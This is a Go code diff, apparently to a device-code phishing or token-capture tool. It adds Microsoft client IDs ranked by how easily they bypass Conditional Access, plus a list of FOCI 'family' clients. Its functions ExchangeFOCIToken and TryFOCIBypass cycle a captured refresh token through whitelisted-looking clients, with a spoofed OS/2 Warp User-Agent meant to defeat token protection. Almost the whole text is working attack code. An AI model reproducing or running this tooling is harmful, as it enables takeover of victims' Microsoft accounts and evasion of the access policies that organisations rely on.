@@ -48,28 +48,95 @@ const (
 )
 
 // Known Microsoft OAuth client IDs (first-party apps)
+// NOTE: Some client IDs bypass Conditional Access policies more easily than others.
+// The CAP bypass rating indicates likelihood of bypassing device compliance requirements:
+//   [HIGH]   - Often whitelisted, used for device enrollment/management
+//   [MEDIUM] - Standard first-party apps, may be blocked by strict CAP
+//   [LOW]    - Well-known, often explicitly blocked
 var KnownClientIDs = map[string]struct {
 	ClientID string
 	Name     string
 	Provider string
 }{
-	// Microsoft clients
-	"ms_office":        {ClientID: "d3590ed6-52b3-4102-aeff-aad2292ab01c", Name: "Microsoft Office", Provider: DCProviderMicrosoft},
-	"ms_teams":         {ClientID: "1fec8e78-bce4-4aaf-ab1b-5451cc387264", Name: "Microsoft Teams", Provider: DCProviderMicrosoft},
-	"azure_cli":        {ClientID: "04b07795-8ddb-461a-bbee-02f9e1bf7b46", Name: "Azure CLI", Provider: DCProviderMicrosoft},
-	"ms_outlook":       {ClientID: "d3590ed6-52b3-4102-aeff-aad2292ab01c", Name: "Microsoft Outlook", Provider: DCProviderMicrosoft},
-	"ms_graph":         {ClientID: "14d82eec-204b-4c2f-b7e8-296a70dab67e", Name: "Microsoft Graph PowerShell", Provider: DCProviderMicrosoft},
-	"ms_auth_broker":   {ClientID: "29d9ed98-a469-4536-ade2-f981bc1d605e", Name: "Microsoft Authentication Broker", Provider: DCProviderMicrosoft},
-	"ms_intune":        {ClientID: "d4244571-73c4-45f0-abf3-17c00ec37858", Name: "Microsoft Intune Portal", Provider: DCProviderMicrosoft},
-	"ms_onedrive":      {ClientID: "b26aadf8-566f-4478-926f-589f601d9c74", Name: "Microsoft OneDrive", Provider: DCProviderMicrosoft},
-	"ms_sharepoint":    {ClientID: "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0", Name: "Microsoft SharePoint", Provider: DCProviderMicrosoft},
+	// ==================== CAP BYPASS CANDIDATES [HIGH] ====================
+	// These clients are involved in device registration/management and are often
+	// whitelisted even in strict Conditional Access environments
+
+	// Microsoft Authentication Broker - handles device registration on Windows
+	// Often whitelisted because blocking it breaks Windows device enrollment
+	"ms_auth_broker": {ClientID: "29d9ed98-a469-4536-ade2-f981bc1d605e", Name: "Microsoft Authentication Broker", Provider: DCProviderMicrosoft},
+
+	// Windows Cloud Experience Host - device OOBE and enrollment
+	// Used during Windows device setup, often exempt from device compliance (circular dependency)
+	"ms_cxh_host": {ClientID: "01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9", Name: "Windows Cloud Experience Host", Provider: DCProviderMicrosoft},
+
+	// Microsoft Intune Company Portal - device enrollment app
+	// Whitelisted in most tenants because it's required TO BECOME compliant
+	"ms_intune_portal": {ClientID: "d4244571-73c4-45f0-abf3-17c00ec37858", Name: "Microsoft Intune Company Portal", Provider: DCProviderMicrosoft},
+
+	// Windows Azure Active Directory - WAM broker
+	// Core Windows identity component, often implicitly trusted
+	"ms_wam": {ClientID: "1b730954-1685-4b74-9bfd-dac224a7b894", Name: "Windows Azure AD", Provider: DCProviderMicrosoft},
+
+	// Microsoft Intune Enrollment - device enrollment service
+	"ms_intune_enroll": {ClientID: "0000000a-0000-0000-c000-000000000000", Name: "Microsoft Intune Enrollment", Provider: DCProviderMicrosoft},
+
+	// Azure AD Registered Device - PRT bootstrap client
+	"ms_aad_reg": {ClientID: "dd762716-544d-4aeb-a526-687b73838a22", Name: "Azure AD Registered Device", Provider: DCProviderMicrosoft},
+
+	// Microsoft Account (MSA) broker for consumer accounts
+	"ms_msa": {ClientID: "f3d6d1d3-d6a6-47ac-ab10-4a8bb6c6e5b8", Name: "Microsoft Account", Provider: DCProviderMicrosoft},
+
+	// ==================== STANDARD CLIENTS [MEDIUM] ====================
+	// Standard Microsoft apps, subject to normal CAP evaluation
+
+	"ms_office":      {ClientID: "d3590ed6-52b3-4102-aeff-aad2292ab01c", Name: "Microsoft Office", Provider: DCProviderMicrosoft},
+	"ms_teams":       {ClientID: "1fec8e78-bce4-4aaf-ab1b-5451cc387264", Name: "Microsoft Teams", Provider: DCProviderMicrosoft},
+	"azure_cli":      {ClientID: "04b07795-8ddb-461a-bbee-02f9e1bf7b46", Name: "Azure CLI", Provider: DCProviderMicrosoft},
+	"ms_outlook":     {ClientID: "d3590ed6-52b3-4102-aeff-aad2292ab01c", Name: "Microsoft Outlook", Provider: DCProviderMicrosoft},
+	"ms_graph":       {ClientID: "14d82eec-204b-4c2f-b7e8-296a70dab67e", Name: "Microsoft Graph PowerShell", Provider: DCProviderMicrosoft},
+	"ms_intune":      {ClientID: "d4244571-73c4-45f0-abf3-17c00ec37858", Name: "Microsoft Intune Portal", Provider: DCProviderMicrosoft},
+	"ms_onedrive":    {ClientID: "b26aadf8-566f-4478-926f-589f601d9c74", Name: "Microsoft OneDrive", Provider: DCProviderMicrosoft},
+	"ms_sharepoint":  {ClientID: "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0", Name: "Microsoft SharePoint", Provider: DCProviderMicrosoft},
 	"ms_authenticator": {ClientID: "4813382a-8fa7-425e-ab75-3b753aab3abb", Name: "Microsoft Authenticator", Provider: DCProviderMicrosoft},
-	// Google clients
+
+	// Microsoft 365 unified app (newer, may have better CAP treatment)
+	"ms_365":         {ClientID: "00b41c95-dab0-4487-9791-b9d2c32c80f2", Name: "Microsoft 365", Provider: DCProviderMicrosoft},
+
+	// Microsoft Edge - browser with native Entra ID integration
+	"ms_edge":        {ClientID: "ecd6b820-32c2-49b6-98a6-444530e5a77a", Name: "Microsoft Edge", Provider: DCProviderMicrosoft},
+
+	// Azure PowerShell - admin tool often whitelisted for ops
+	"azure_ps":       {ClientID: "1950a258-227b-4e31-a9cf-717495945fc2", Name: "Azure PowerShell", Provider: DCProviderMicrosoft},
+
+	// Visual Studio - developer tool often whitelisted
+	"ms_vs":          {ClientID: "872cd9fa-d31f-45e0-9eab-6e460a02d1f1", Name: "Visual Studio", Provider: DCProviderMicrosoft},
+
+	// Office Hub (FOCI member, can exchange tokens with other FOCI clients)
+	"ms_office_hub":  {ClientID: "4765445b-32c6-49b0-83e6-1d93765276ca", Name: "Microsoft Office Hub", Provider: DCProviderMicrosoft},
+
+	// ==================== GOOGLE CLIENTS ====================
 	"google_cloud_sdk":     {ClientID: "32555940559.apps.googleusercontent.com", Name: "Google Cloud SDK", Provider: DCProviderGoogle},
 	"google_tv":            {ClientID: "300553494095-k0t2me0njk63h2t66mfcl97dpjfomf2p.apps.googleusercontent.com", Name: "Google TV", Provider: DCProviderGoogle},
 	"google_device_policy": {ClientID: "607806427481-viqkf4mf7f7oedu95uh6urp1k2knguib.apps.googleusercontent.com", Name: "Google Device Policy", Provider: DCProviderGoogle},
 	"google_chrome_sync":   {ClientID: "77185425430.apps.googleusercontent.com", Name: "Google Chrome Sync", Provider: DCProviderGoogle},
 	"google_ios":           {ClientID: "49625052041-g2ai52selqdp6bkvb5bki7bk3ns2mrn2.apps.googleusercontent.com", Name: "Google iOS", Provider: DCProviderGoogle},
+}
+
+// FOCIClients lists client IDs that belong to Microsoft's "Family of Client IDs" (FOCI)
+// FOCI clients share refresh tokens! If you get a token from one, you can exchange to another.
+// This allows pivoting to a different client that might not be blocked by CAP.
+var FOCIClients = []string{
+	"d3590ed6-52b3-4102-aeff-aad2292ab01c", // Microsoft Office
+	"1fec8e78-bce4-4aaf-ab1b-5451cc387264", // Microsoft Teams
+	"00b41c95-dab0-4487-9791-b9d2c32c80f2", // Microsoft 365
+	"4765445b-32c6-49b0-83e6-1d93765276ca", // Microsoft Office Hub
+	"d326c1ce-6cc6-4de2-bebc-4591e5e13ef0", // SharePoint
+	"27922004-5251-4030-b22d-91ecd9a37ea4", // Outlook Mobile
+	"ab9b8c07-8f02-4f72-87fa-80105867a763", // OneDrive iOS
+	"b26aadf8-566f-4478-926f-589f601d9c74", // OneDrive
+	"2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8", // Microsoft Bing Search
+	"844cca35-0656-46ce-b636-13f48b0eecbd", // Microsoft To-Do
 }
 
 // GoogleClientSecrets stores client_secret for Google OAuth clients that require it
@@ -894,4 +961,157 @@ func (s *DeviceCodeSession) TimeRemaining() time.Duration {
 		return 0
 	}
 	return remaining
+}
+
+// ============================================================================
+// FOCI (Family of Client IDs) TOKEN EXCHANGE
+// ============================================================================
+// Microsoft's FOCI allows refresh tokens to be exchanged between first-party apps.
+// This enables bypassing Conditional Access by pivoting from a blocked client
+// to one that might be whitelisted.
+
+// IsFOCIClient checks if a client ID is part of the FOCI family
+func IsFOCIClient(clientID string) bool {
+	for _, id := range FOCIClients {
+		if id == clientID {
+			return true
+		}
+	}
+	return false
+}
+
+// ExchangeFOCIToken exchanges a refresh token from one FOCI client to another.
+// This can bypass Conditional Access policies that block specific client apps.
+// The original refresh token must be from a FOCI-enabled client.
+//
+// Usage: If ms_office is blocked by CAP, try exchanging to ms_365 or ms_teams
+func (m *DeviceCodeManager) ExchangeFOCIToken(sessionID string, newClientAlias string, newScope string) error {
+	m.mu.RLock()
+	session, ok := m.sessions[sessionID]
+	m.mu.RUnlock()
+
+	if !ok {
+		return fmt.Errorf("session not found: %s", sessionID)
+	}
+
+	session.mu.Lock()
+	refreshToken := session.RefreshToken
+	provider := session.Provider
+	tenant := session.Tenant
+	originalClientID := session.ClientID
+	session.mu.Unlock()
+
+	if refreshToken == "" {
+		return fmt.Errorf("no refresh token available for FOCI exchange")
+	}
+
+	if provider != DCProviderMicrosoft {
+		return fmt.Errorf("FOCI exchange only works with Microsoft tokens")
+	}
+
+	// Check if original client is FOCI-enabled
+	if !IsFOCIClient(originalClientID) {
+		log.Warning("[devicecode] [%s] original client %s is not FOCI-enabled, exchange may fail", sessionID, originalClientID)
+	}
+
+	// Get new client ID
+	newClient, ok := KnownClientIDs[newClientAlias]
+	if !ok {
+		return fmt.Errorf("unknown client alias: %s", newClientAlias)
+	}
+
+	newClientID := newClient.ClientID
+	if !IsFOCIClient(newClientID) {
+		log.Warning("[devicecode] [%s] target client %s is not FOCI-enabled, exchange may fail", sessionID, newClientAlias)
+	}
+
+	// Resolve scope
+	scope := newScope
+	if s, ok := ScopePresets[newScope]; ok {
+		scope = s
+	}
+
+	tokenURL := fmt.Sprintf(MS_TOKEN_URL, tenant)
+
+	data := url.Values{}
+	data.Set("client_id", newClientID)
+	data.Set("grant_type", "refresh_token")
+	data.Set("refresh_token", refreshToken)
+	data.Set("scope", scope)
+
+	log.Info("[devicecode] [%s] FOCI exchange: %s -> %s", sessionID, originalClientID[:8]+"...", newClientAlias)
+
+	req, err := http.NewRequest("POST", tokenURL, strings.NewReader(data.Encode()))
+	if err != nil {
+		return fmt.Errorf("failed to create FOCI exchange request: %v", err)
+	}
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	// Use OS/2 Warp UA to bypass token protection
+	req.Header.Set("User-Agent", OS2_WARP_UA)
+
+	client := &http.Client{Timeout: 30 * time.Second}
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("FOCI exchange request failed: %v", err)
+	}
+	defer resp.Body.Close()
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return fmt.Errorf("failed to read FOCI response: %v", err)
+	}
+
+	if resp.StatusCode != 200 {
+		var errResp TokenErrorResponse
+		json.Unmarshal(body, &errResp)
+		return fmt.Errorf("FOCI exchange failed (%d): %s - %s", resp.StatusCode, errResp.Error, errResp.ErrorDescription)
+	}
+
+	var tokenResp TokenResponse
+	if err := json.Unmarshal(body, &tokenResp); err != nil {
+		return fmt.Errorf("failed to parse FOCI response: %v", err)
+	}
+
+	// Update session with new tokens (keep original session but update client info)
+	session.mu.Lock()
+	session.AccessToken = tokenResp.AccessToken
+	if tokenResp.RefreshToken != "" {
+		session.RefreshToken = tokenResp.RefreshToken
+	}
+	session.ClientID = newClientID
+	session.ClientName = newClient.Name
+	session.TokenScope = tokenResp.Scope
+	session.TokenExpiry = time.Now().Add(time.Duration(tokenResp.ExpiresIn) * time.Second)
+	session.Metadata["foci_exchange"] = fmt.Sprintf("%s -> %s", originalClientID, newClientID)
+	session.mu.Unlock()
+
+	log.Success("[devicecode] [%s] FOCI exchange successful! New client: %s", sessionID, newClient.Name)
+	return nil
+}
+
+// TryFOCIBypass attempts to exchange tokens through multiple FOCI clients
+// to find one that bypasses the current Conditional Access policy.
+// Returns the successful client alias or error if all fail.
+func (m *DeviceCodeManager) TryFOCIBypass(sessionID string, scope string) (string, error) {
+	// Priority order: enrollment/broker clients first (more likely to be whitelisted)
+	bypassClients := []string{
+		"ms_auth_broker",   // Highest chance - device enrollment
+		"ms_cxh_host",      // Windows OOBE
+		"ms_intune_portal", // Device compliance enrollment
+		"ms_wam",           // Windows broker
+		"ms_365",           // Newer unified app
+		"azure_cli",        // Admin tool
+		"ms_teams",         // Common FOCI member
+	}
+
+	for _, clientAlias := range bypassClients {
+		log.Info("[devicecode] [%s] trying FOCI bypass with %s...", sessionID, clientAlias)
+		err := m.ExchangeFOCIToken(sessionID, clientAlias, scope)
+		if err == nil {
+			return clientAlias, nil
+		}
+		log.Debug("[devicecode] [%s] %s failed: %v", sessionID, clientAlias, err)
+	}
+
+	return "", fmt.Errorf("all FOCI bypass attempts failed")
 }
